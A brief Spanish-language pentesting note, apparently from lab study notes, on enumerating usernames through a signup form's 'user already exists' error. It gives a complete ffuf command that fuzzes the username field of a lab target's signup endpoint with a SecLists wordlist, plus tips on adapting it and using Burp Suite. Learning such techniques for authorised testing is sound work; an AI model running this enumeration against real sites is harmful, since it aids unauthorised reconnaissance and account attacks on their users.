## Fuzzing usuarios
Al darte de alta en un sitio web, si un usuario existe, normalmente reporta "Error user already exists". En ese caso podemos aprovechar para enumerar usuarios. En el campo username metemos una lista de seclists, y el resto de campos los inventamos.  

```ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.144.67/customers/signup -mr "username already exists" ```
Este comando hay que darle forma especificamente en cada sitio. editando el POST, la URL, el -mr para que coincida con el mensaje en cuestión, y si acaso la cabecera -H.  

  Lo mejor es analizar la petición con burpsuite. No se recomienda el payload a traves de burpsuite por su lentitud.
